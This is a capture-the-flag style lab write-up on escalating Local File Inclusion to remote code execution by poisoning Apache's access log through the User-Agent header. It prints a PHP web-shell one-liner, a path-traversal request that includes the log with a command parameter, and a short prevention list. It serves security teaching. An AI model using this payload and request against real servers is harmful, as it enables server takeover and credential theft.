# LFI to RCE via Log Poisoning

## Lab Overview

This lab demonstrates how a **Local File Inclusion (LFI)** vulnerability can be escalated into **Remote Code Execution (RCE)** using **log poisoning**.

Main learning point:

If attackers can:

1. Inject PHP code into server logs
2. Include those logs through LFI

then the server may execute attacker-controlled PHP code.

---

# What is Log Poisoning?

Web servers store request information inside log files.

Example logged data:

- URL paths
- IP addresses
- User-Agent headers
- Request methods

If attacker-controlled input is written into logs without sanitization, malicious PHP code can be injected into log files.

# Step 2 - Identify Web Server

Identified server technology:

```text
Apache
```

This is important because log file locations differ depending on server type.

Common examples:

| Server | Access Log Path |
|---|---|
| Apache | `/var/log/apache2/access.log` |
| Nginx | `/var/log/nginx/access.log` |

---

# Step 3 - Locate Apache Logs

Target log file:

```text
/var/log/apache2/access.log
```

This file stores HTTP request details including headers like:

```text
User-Agent
```

---

# Why User-Agent Is Useful

Attackers fully control the User-Agent header.

Example:

```http
User-Agent: Mozilla/5.0
```

Since Apache logs this value, injected PHP code becomes stored inside the log file.

---

# What Happens Internally?

Apache writes request data into:

```text
/var/log/apache2/access.log
```

Resulting log entry:

```text
<?php system($_GET['cmd']); ?>
```

The PHP payload is now stored on the server.

---

# Step 5 - Include Log File through LFI

Requested:

```text
/index.php?language=../../../../../../../var/log/apache2/access.log&cmd=id

```

# Why This Leads to RCE

The vulnerable application executes:

```php
include("/var/log/apache2/access.log");
```

PHP process:

```text
1. Open access.log
2. Parse contents as PHP
3. Execute injected PHP payload
```

Injected code becomes active:

```php
system($_GET['cmd']);
```

---

# Command Execution

Used:

```text
cmd=id
```

Server executed:

```bash
id
```

Response confirmed Remote Code Execution.

---

# Attack Flow Summary

```text
Inject PHP into logs
        ↓
Logs store attacker payload
        ↓
LFI includes log file
        ↓
PHP executes injected payload
        ↓
Remote Code Execution
```

---

# Key Learnings

- LFI can escalate into full RCE
- Server logs often contain attacker-controlled input
- User-Agent headers are commonly abused
- Log poisoning is highly effective against PHP applications
- Understanding server technology is critical during exploitation

---

# Security Impact

Successful exploitation may lead to:

- Full server compromise
- Arbitrary command execution
- Web shell deployment
- Credential theft
- Privilege escalation

---

# Prevention

- Never pass user input directly into:
  
```php
include()
require()
```

- Disable dangerous PHP functions:
  
```ini
system
exec
shell_exec
```

- Restrict access to log files
- Sanitize logged input
- Use least-privilege permissions on logs
- Monitor suspicious User-Agent values
